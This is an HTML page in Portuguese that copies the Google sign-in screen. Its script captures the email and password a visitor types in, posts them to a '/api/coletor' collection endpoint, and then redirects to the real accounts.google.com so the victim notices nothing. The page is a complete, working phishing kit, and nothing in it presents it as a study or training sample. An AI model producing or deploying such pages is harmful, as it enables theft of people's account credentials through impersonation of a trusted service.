<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Fazer login – Google</title>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
    }
    .login-card {
      max-width: 360px;
      margin: 100px auto;
      padding: 40px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      box-shadow: 0px 1px 3px rgba(60,64,67,.3);
      text-align: center;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      font-size: 16px;
    }
    button {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 10px 24px;
      border-radius: 4px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<div class="login-card">
  <h2>Fazer login</h2>
  <p>Use sua Conta do Google</p>
  <form id="loginForm">
    <input type="email" name="email" placeholder="Email ou telefone" required>
    <input type="password" name="senha" placeholder="Senha" required>
    <button type="submit">Próxima</button>
  </form>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const email = e.target.email.value;
    const senha = e.target.senha.value;

    fetch("/api/coletor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, senha })
    }).then(() => {
      window.location.href = "https://accounts.google.com/";
    });
  });
</script>

</body>
</html>
